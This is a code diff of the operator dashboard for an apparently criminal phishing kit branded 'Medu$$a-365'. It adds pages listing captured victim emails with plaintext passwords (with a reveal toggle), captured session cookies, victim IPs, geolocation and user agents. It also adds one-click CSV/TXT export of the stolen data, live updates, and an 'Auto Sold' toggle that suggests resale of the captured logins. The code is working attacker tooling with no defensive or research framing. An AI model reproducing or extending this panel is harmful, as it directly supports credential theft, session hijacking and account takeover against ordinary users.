+                case 'credentials': await loadCredentials(); break;
+                case 'cookies': await loadCookies(); break;
+                case 'history': await loadHistory(); break;
+                case 'settings': loadSettings(); break;
+                default: pageContent.innerHTML = '<div class="card"><p>Page not found.</p></div>';
+            }
+        }
+
+        // ─── OVERVIEW (New Professional Layout) ───
         async function loadOverview() {
             try {
                 const stats = await fetchWithAuth('/api/stats');
@@ -626,138 +309,232 @@
                 pageContent.innerHTML = `
                     <div class="stats-grid">
                         <div class="stat-card">
-                            <div class="stat-header">
-                                <div class="stat-icon"><i class="lucide lucide-user"></i></div>
-                                <span class="stat-percent positive">+13%</span>
-                            </div>
-                            <div class="stat-info">
-                                <div class="label">Unique Users</div>
-                                <div class="value">${stats.sessions}</div>
-                            </div>
+                            <div class="stat-header"><div class="stat-icon"><i class="lucide lucide-user"></i></div><span class="stat-percent positive">+13%</span></div>
+                            <div class="stat-info"><div class="label">Unique Users</div><div class="value">${stats.sessions}</div></div>
                             <div class="stat-footer">Unique visitors</div>
                         </div>
                         <div class="stat-card">
-                            <div class="stat-header">
-                                <div class="stat-icon" style="color:#ef4444;"><i class="lucide lucide-alert-triangle"></i></div>
-                                <span class="stat-percent positive">+16%</span>
-                            </div>
-                            <div class="stat-info">
-                                <div class="label">Failed Logins</div>
-                                <div class="value">${stats.credentials}</div>
-                            </div>
+                            <div class="stat-header"><div class="stat-icon" style="color:#ef4444;"><i class="lucide lucide-alert-triangle"></i></div><span class="stat-percent positive">+16%</span></div>
+                            <div class="stat-info"><div class="label">Failed Logins</div><div class="value">${stats.credentials}</div></div>
                             <div class="stat-footer">Unique visitors</div>
                         </div>
                         <div class="stat-card">
-                            <div class="stat-header">
-                                <div class="stat-icon"><i class="lucide lucide-check-circle"></i></div>
-                                <span class="stat-percent positive">0%</span>
-                            </div>
-                            <div class="stat-info">
-                                <div class="label">Success Logins</div>
-                                <div class="value">${stats.cookies}</div>
-                            </div>
+                            <div class="stat-header"><div class="stat-icon"><i class="lucide lucide-check-circle"></i></div><span class="stat-percent positive">0%</span></div>
+                            <div class="stat-info"><div class="label">Success Logins</div><div class="value">${stats.cookies}</div></div>
                             <div class="stat-footer">Unique visitors</div>
                         </div>
                         <div class="stat-card">
-                            <div class="stat-header">
-                                <div class="stat-header">
-                                    <div style="display:flex; gap:8px; align-items:center;">
-                                        <div class="stat-icon" style="background:#78350f; color:#fbbf24;"><i class="lucide lucide-link"></i></div>
-                                        <div>
-                                            <div class="label">Black URL</div>
-                                            <div class="stat-info" style="font-size:0.8rem; color:var(--muted);">Auto Sold</div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px;">
-                                <span style="font-size:0.8rem; color:var(--muted);">Auto Sold</span>
-                                <div class="toggle active" onclick="this.classList.toggle('active')"></div>
-                            </div>
+                            <div class="stat-header"><div style="display:flex; gap:8px; align-items:center;"><div class="stat-icon" style="background:#78350f; color:#fbbf24;"><i class="lucide lucide-link"></i></div><div><div class="label">Black URL</div><div style="font-size:0.8rem; color:var(--muted);">Auto Sold</div></div></div></div>
+                            <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px;"><span style="font-size:0.8rem; color:var(--muted);">Auto Sold</span><div class="toggle active" onclick="this.classList.toggle('active')"></div></div>
                         </div>
                     </div>
-
                     <div style="display:grid; grid-template-columns: 2fr 1fr; gap:20px;">
                         <div class="card">
-                            <div class="card-header">
-                                <div class="card-title">Visitors Last 7 Days</div>
-                                <div class="card-actions"><button>Last 7 days <i class="lucide lucide-chevron-down"></i></button></div>
-                            </div>
+                            <div class="card-header"><div class="card-title">Visitors Last 7 Days</div><div class="card-actions"><button>Last 7 days <i class="lucide lucide-chevron-down"></i></button></div></div>
                             <div class="chart-placeholder">
-                                <div class="chart-bar" style="height:40%;"></div>
-                                <div class="chart-bar" style="height:55%;"></div>
-                                <div class="chart-bar" style="height:30%;"></div>
-                                <div class="chart-bar" style="height:80%;"></div>
-                                <div class="chart-bar" style="height:60%;"></div>
-                                <div class="chart-bar" style="height:90%;"></div>
-                                <div class="chart-bar" style="height:70%;"></div>
+                                <div class="chart-bar" style="height:40%;"></div><div class="chart-bar" style="height:55%;"></div><div class="chart-bar" style="height:30%;"></div><div class="chart-bar" style="height:80%;"></div><div class="chart-bar" style="height:60%;"></div><div class="chart-bar" style="height:90%;"></div><div class="chart-bar" style="height:70%;"></div>
                             </div>
                         </div>
                         <div class="card">
-                            <div class="card-header">
-                                <div class="card-title">Top Countries</div>
-                            </div>
-                            <div class="empty-state" style="height:250px; display:flex; flex-direction:column; justify-content:center;">
-                                <i class="lucide lucide-globe"></i>
-                                <p>No data yet</p>
-                            </div>
+                            <div class="card-header"><div class="card-title">Top Countries</div></div>
+                            <div class="empty-state" style="height:250px; display:flex; flex-direction:column; justify-content:center;"><i class="lucide lucide-globe"></i><p>No data yet</p></div>
                         </div>
                     </div>
-
                     <div style="display:grid; grid-template-columns: 1fr 1fr; gap:20px;">
                         <div class="card">
-                            <div class="card-header">
-                                <div class="card-title">Recent Logins Captured</div>
-                                <div class="card-actions"><button>View all</button></div>
-                            </div>
-                            <div class="table-wrap">
-                                <table>
-                                    <thead><tr><th>Country</th><th>IP</th><th>Date</th><th>Status</th></tr></thead>
-                                    <tbody>
-                                        ${sessions.slice(0,5).map(s => `
-                                            <tr>
-                                                <td>${s.geo ? escapeHtml(s.geo.country||'') : '-'}</td>
-                                                <td>${escapeHtml(s.ip || '-')}</td>
-                                                <td>${formatDate(s.updated_at)}</td>
-                                                <td>${escapeHtml(s.status || '-')}</td>
-                                            </tr>
-                                        `).join('')}
-                                        ${sessions.length === 0 ? `<tr><td colspan="4" style="text-align:center;padding:20px; color:var(--muted);">No data available</td></tr>` : ''}
-                                    </tbody>
-                                </table>
-                            </div>
+                            <div class="card-header"><div class="card-title">Recent Logins Captured</div><div class="card-actions"><button onclick="loadPage('sessions')">View all</button></div></div>
+                            <div class="table-wrap"><table><thead><tr><th>Country</th><th>IP</th><th>Date</th><th>Status</th></tr></thead><tbody>
+                                ${sessions.slice(0,5).map(s => `<tr><td>${s.geo ? escapeHtml(s.geo.country||'') : '-'}</td><td>${escapeHtml(s.ip || '-')}</td><td>${formatDate(s.updated_at)}</td><td>${escapeHtml(s.status || '-')}</td></tr>`).join('')}
+                                ${sessions.length === 0 ? `<tr><td colspan="4" style="text-align:center;padding:20px; color:var(--muted);">No data available</td></tr>` : ''}
+                            </tbody></table></div>
                         </div>
-
                         <div class="card">
-                            <div class="card-header">
-                                <div class="card-title">Recent Visitors</div>
-                                <div class="card-actions"><button>View all</button></div>
-                            </div>
-                            <div class="table-wrap">
-                                <table>
-                                    <thead><tr><th>IP Address</th><th>Country</th><th>Status</th></tr></thead>
-                                    <tbody>
-                                        ${sessions.slice(0,5).map(s => `
-                                            <tr>
-                                                <td>${escapeHtml(s.ip || '-')}</td>
-                                                <td>${s.geo ? escapeHtml(s.geo.country||'') : '-'}</td>
-                                                <td>${escapeHtml(s.status || '-')}</td>
-                                            </tr>
-                                        `).join('')}
-                                        ${sessions.length === 0 ? `<tr><td colspan="3" style="text-align:center;padding:20px; color:var(--muted);">No data available</td></tr>` : ''}
-                                    </tbody>
-                                </table>
-                            </div>
+                            <div class="card-header"><div class="card-title">Recent Visitors</div><div class="card-actions"><button onclick="loadPage('sessions')">View all</button></div></div>
+                            <div class="table-wrap"><table><thead><tr><th>IP Address</th><th>Country</th><th>Status</th></tr></thead><tbody>
+                                ${sessions.slice(0,5).map(s => `<tr><td>${escapeHtml(s.ip || '-')}</td><td>${s.geo ? escapeHtml(s.geo.country||'') : '-'}</td><td>${escapeHtml(s.status || '-')}</td></tr>`).join('')}
+                                ${sessions.length === 0 ? `<tr><td colspan="3" style="text-align:center;padding:20px; color:var(--muted);">No data available</td></tr>` : ''}
+                            </tbody></table></div>
                         </div>
-                    </div>
-                `;
+                    </div>`;
+            } catch (e) { console.error(e); pageContent.innerHTML = '<div class="empty-state">Failed to load data. Check server logs.</div>'; }
+        }
+
+        // ─── SESSIONS ───
+        async function loadSessions() {
+            try {
+                const sessions = await fetchWithAuth('/api/sessions');
+                allSessions = sessions;
+                pageContent.innerHTML = `
+                    <div class="card">
+                        <div class="card-header"><div class="card-title"><i class="lucide lucide-monitor"></i> All Sessions</div>
+                        <div class="card-actions"><button onclick="exportSessionsCSV()">CSV</button><button onclick="exportSessionsTXT()">TXT</button></div></div>
+                        <div class="table-wrap"><table>
+                        <thead><tr><th>IP</th><th>UA</th><th>Geo</th><th>Target</th><th>Status</th><th>Email</th><th>Cookies</th><th style="width:80px;">Actions</th></tr></thead>
+                        <tbody>${sessions.map(s => `<tr>
+                            <td>${escapeHtml(s.ip || '-')}</td><td class="text-truncate" title="${escapeHtml(s.user_agent||'')}">${escapeHtml((s.user_agent||'-').slice(0,40))}</td>
+                            <td>${s.geo ? `${escapeHtml(s.geo.city||'')}, ${escapeHtml(s.geo.country||'')}` : '-'}</td>
+                            <td>${escapeHtml(s.host || '-')}</td><td>${escapeHtml(s.status || '-')}</td>
+                            <td>${escapeHtml(s.email || '-')}</td><td>${s.cookie_count || 0}</td>
+                            <td><div class="actions"><button class="btn-icon copy" onclick="copyText('${escapeHtml(s.ip||'')}','IP')"><i class="lucide lucide-copy"></i></button><button class="btn-icon delete" onclick="deleteSession('${s.id}')"><i class="lucide lucide-trash-2"></i></button></div></td>
+                        </tr>`).join('')}
+                        ${sessions.length === 0 ? `<tr><td colspan="8" style="text-align:center;padding:20px; color:var(--muted);">No sessions yet</td></tr>` : ''}
+                        </tbody></table></div>
+                    </div>`;
             } catch (e) { console.error(e); }
         }
 
-        // ... The rest of your original JavaScript remains exactly the same ...
-        // (All the fetchWithAuth, loadSessions, loadCredentials, loadHistory, etc. functions)
-        // Just paste your original script block here, replacing only the `loadOverview` function.
+        async function deleteSession(id) {
+            if (!confirm('Delete this session and all its data?')) return;
+            try {
+                const res = await fetch(`/api/sessions/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${token}` } });
+                if (res.ok) { toast('Session deleted', 'lucide-trash-2'); loadPage('sessions'); } else toast('Delete failed', 'lucide-alert-circle');
+            } catch (e) { toast('Error', 'lucide-alert-circle'); }
+        }
+        function exportSessionsCSV() { downloadCSV(allSessions, ['id', 'ip', 'user_agent', 'host', 'status', 'email'], 'sessions_export'); }
+        function exportSessionsTXT() { downloadTXT(allSessions, ['id', 'ip', 'user_agent', 'host', 'status', 'email'], 'sessions_export'); }
 
+        // ─── CREDENTIALS ───
+        async function loadCredentials() {
+            try {
+                const creds = await fetchWithAuth('/api/credentials');
+                allCreds = creds;
+                pageContent.innerHTML = `
+                    <div class="card">
+                        <div class="card-header"><div class="card-title"><i class="lucide lucide-key"></i> Captured Credentials</div>
+                        <div class="card-actions"><button onclick="exportCredsCSV()">CSV</button><button onclick="exportCredsTXT()">TXT</button></div></div>
+                        <div class="table-wrap"><table>
+                        <thead><tr><th>Email</th><th>Password</th><th>IP</th><th>Host</th><th>Captured</th><th style="width:120px;">Actions</th></tr></thead>
+                        <tbody>${creds.map((c,i) => {
+                            const rid = `cred-${i}`;
+                            const revealed = revealedPasswords.has(rid);
+                            const pw = c.password || '';
+                            const displayPw = revealed ? escapeHtml(pw) : concealPw(pw);
+                            return `<tr>
+                                <td>${escapeHtml(c.email || '-')}</td>
+                                <td><span class="${revealed ? 'password-dots revealed' : 'password-dots'}">${displayPw}</span>
+                                <button class="btn-icon" onclick="togglePw('${rid}')" title="Show/Hide"><i class="lucide lucide-${revealed?'eye-off':'eye'}"></i></button></td>
+                                <td>${escapeHtml(c.ip || '-')}</td><td>${escapeHtml(c.host || '-')}</td><td>${formatDate(c.captured_at)}</td>
+                                <td><div class="actions"><button class="btn-icon copy" onclick="copyText('${escapeHtml(c.email||'')}','Email')"><i class="lucide lucide-copy"></i></button>
+                                <button class="btn-icon copy" onclick="copyText('${escapeHtml(pw)}','Password')"><i class="lucide lucide-copy"></i></button>
+                                <button class="btn-icon delete" onclick="deleteCred(${c.id})"><i class="lucide lucide-trash-2"></i></button></div></td>
+                            </tr>`}).join('')}
+                            ${creds.length === 0 ? `<tr><td colspan="6" style="text-align:center;padding:20px; color:var(--muted);">No credentials captured</td></tr>` : ''}
+                        </tbody></table></div>
+                    </div>`;
+            } catch (e) { console.error(e); }
+        }
+        function togglePw(id) { if (revealedPasswords.has(id)) revealedPasswords.delete(id); else revealedPasswords.add(id); loadPage('credentials'); }
+        async function deleteCred(id) {
+            if (!confirm('Delete this credential?')) return;
+            try { const res = await fetch(`/api/credentials/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${token}` } }); if (res.ok) { toast('Credential deleted', 'lucide-trash-2'); loadPage('credentials'); } } catch (e) { toast('Error', 'lucide-alert-circle'); }
+        }
+        function exportCredsCSV() { downloadCSV(allCreds, ['id', 'email', 'password', 'ip', 'host', 'captured_at'], 'credentials_export'); }
+        function exportCredsTXT() { downloadTXT(allCreds, ['id', 'email', 'password', 'ip', 'host', 'captured_at'], 'credentials_export'); }
+
+        // ─── COOKIES ───
+        async function loadCookies() {
+            try {
+                const cookies = await fetchWithAuth('/api/cookies');
+                allCookies = cookies;
+                pageContent.innerHTML = `
+                    <div class="card">
+                        <div class="card-header"><div class="card-title"><i class="lucide lucide-cookie"></i> Captured Cookies</div>
+                        <div class="card-actions"><button onclick="exportCookiesCSV()">CSV</button><button onclick="exportCookiesTXT()">TXT</button></div></div>
+                        <div class="table-wrap"><table>
+                        <thead><tr><th>Name</th><th>Domain</th><th>Expires</th><th>IP</th><th>Host</th><th style="width:80px;">Actions</th></tr></thead>
+                        <tbody>${cookies.map(c => `<tr>
+                            <td>${escapeHtml(c.name || '-')}</td><td>${escapeHtml(c.domain || '-')}</td><td>${c.expires ? formatDate(c.expires) : '-'}</td>
+                            <td>${escapeHtml(c.ip || '-')}</td><td>${escapeHtml(c.host || '-')}</td>
+                            <td><div class="actions"><button class="btn-icon copy" onclick="copyText('${escapeHtml(c.value||'')}','Cookie')"><i class="lucide lucide-copy"></i></button><button class="btn-icon delete" onclick="deleteCookie(${c.id})"><i class="lucide lucide-trash-2"></i></button></div></td>
+                        </tr>`).join('')}
+                        ${cookies.length === 0 ? `<tr><td colspan="6" style="text-align:center;padding:20px; color:var(--muted);">No cookies captured</td></tr>` : ''}
+                        </tbody></table></div>
+                    </div>`;
+            } catch (e) { console.error(e); }
+        }
+        async function deleteCookie(id) {
+            if (!confirm('Delete this cookie?')) return;
+            try { const res = await fetch(`/api/cookies/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${token}` } }); if (res.ok) { toast('Cookie deleted', 'lucide-trash-2'); loadPage('cookies'); } } catch (e) { toast('Error', 'lucide-alert-circle'); }
+        }
+        function exportCookiesCSV() { downloadCSV(allCookies, ['id', 'name', 'value', 'domain', 'expires', 'ip', 'host'], 'cookies_export'); }
+        function exportCookiesTXT() { downloadTXT(allCookies, ['id', 'name', 'value', 'domain', 'expires', 'ip', 'host'], 'cookies_export'); }
+
+        // ─── HISTORY ───
+        async function loadHistory() {
+            try {
+                const [creds, cookies] = await Promise.all([fetchWithAuth('/api/credentials'), fetchWithAuth('/api/cookies')]);
+                const entries = [];
+                creds.forEach(c => entries.push({ ...c, type: 'credential', ts: c.captured_at }));
+                cookies.forEach(c => entries.push({ ...c, type: 'cookie', ts: c.captured_at }));
+                entries.sort((a, b) => new Date(b.ts) - new Date(a.ts));
+                allHistory = entries;
+                pageContent.innerHTML = `
+                    <div class="card">
+                        <div class="card-header"><div class="card-title"><i class="lucide lucide-clock"></i> Capture History</div>
+                        <div class="card-actions"><button onclick="exportHistoryCSV()">CSV</button><button onclick="exportHistoryTXT()">TXT</button></div></div>
+                        <div class="table-wrap"><table>
+                        <thead><tr><th>Type</th><th>Detail</th><th>IP</th><th>Host</th><th>Timestamp</th></tr></thead>
+                        <tbody>${entries.slice(0,200).map(e => `<tr>
+                            <td style="color:${e.type==='credential'?'var(--red)':'var(--muted)'};">${e.type}</td>
+                            <td>${e.type==='credential' ? `${escapeHtml(e.email||'-')} / ${concealPw(e.password||'')}` : `${escapeHtml(e.name||'-')}=${escapeHtml((e.value||'').slice(0,20))}…`}</td>
+                            <td>${escapeHtml(e.ip || '-')}</td><td>${escapeHtml(e.host || '-')}</td><td>${formatDate(e.ts)}</td>
+                        </tr>`).join('')}
+                        ${entries.length === 0 ? `<tr><td colspan="5" style="text-align:center;padding:20px; color:var(--muted);">No captures yet</td></tr>` : ''}
+                        </tbody></table></div>
+                    </div>`;
+            } catch (e) { console.error(e); }
+        }
+        function exportHistoryCSV() { downloadCSV(allHistory.map(e => ({ type: e.type, detail: e.type === 'credential' ? `${e.email||''} / ${e.password||''}` : `${e.name||''}=${e.value||''}`, ip: e.ip, host: e.host, ts: e.ts })), ['type', 'detail', 'ip', 'host', 'ts'], 'history_export'); }
+        function exportHistoryTXT() { downloadTXT(allHistory.map(e => ({ type: e.type, detail: e.type === 'credential' ? `${e.email||''} / ${e.password||''}` : `${e.name||''}=${e.value||''}`, ip: e.ip, host: e.host, ts: e.ts })), ['type', 'detail', 'ip', 'host', 'ts'], 'history_export'); }
+
+        // ─── SETTINGS ───
+        function loadSettings() {
+            pageContent.innerHTML = `
+                <div class="card">
+                    <div class="card-header"><div class="card-title"><i class="lucide lucide-settings"></i> Settings</div></div>
+                    <div class="settings-group">
+                        <h4 style="color:var(--muted);font-weight:600;font-size:0.8rem;text-transform:uppercase;margin-bottom:10px;">Appearance</h4>
+                        <div class="setting-row" style="display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border);">
+                            <div><div class="label">Dark Theme</div><div class="desc" style="color:var(--muted);font-size:0.8rem;">Always on — Medu$$a-365 is forged in black and red.</div></div>
+                            <div class="toggle active" onclick="this.classList.toggle('active')"></div>
+                        </div>
+                    </div>
+                    <div class="settings-group">
+                        <h4 style="color:var(--muted);font-weight:600;font-size:0.8rem;text-transform:uppercase;margin-bottom:10px;">Data</h4>
+                        <div class="setting-row" style="display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border);">
+                            <div><div class="label">Auto-refresh</div><div class="desc" style="color:var(--muted);font-size:0.8rem;">Live updates via SSE</div></div>
+                            <div class="toggle active" onclick="this.classList.toggle('active')"></div>
+                        </div>
+                        <div class="setting-row" style="display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid var(--border);">
+                            <div><div class="label">Export Format</div><div class="desc" style="color:var(--muted);font-size:0.8rem;">Default export format</div></div>
+                            <select style="background:var(--surface2);border:1px solid var(--border);color:var(--text);padding:6px 12px;border-radius:6px;"><option value="csv">CSV</option><option value="txt">TXT</option></select>
+                        </div>
+                    </div>
+                    <div class="settings-group">
+                        <h4 style="color:var(--muted);font-weight:600;font-size:0.8rem;text-transform:uppercase;margin-bottom:10px;">Security</h4>
+                        <div class="setting-row" style="display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border);">
+                            <div><div class="label">Session Timeout</div><div class="desc" style="color:var(--muted);font-size:0.8rem;">Auto-logout after inactivity (hours)</div></div>
+                            <input type="text" value="12" style="background:var(--surface2);border:1px solid var(--border);color:var(--text);padding:6px 12px;border-radius:6px;width:80px;text-align:center;" />
+                        </div>
+                    </div>
+                </div>`;
+        }
+
+        // ─── BADGES & SSE ───
+        function updateBadges(stats) {
+            if (!stats) return;
+            badgeSessions.textContent = stats.sessions || 0;
+            badgeCreds.textContent = stats.credentials || 0;
+            badgeCookies.textContent = stats.cookies || 0;
+        }
+        function connectSSE() {
+            if (sseConnection) sseConnection.close();
+            sseConnection = new EventSource('/api/events');
+            sseConnection.onmessage = (event) => {
+                loadPage(currentPage);
+                fetchWithAuth('/api/stats').then(s => updateBadges(s)).catch(() => {});
+            };
+        }
     </script>
 </body>
 </html>
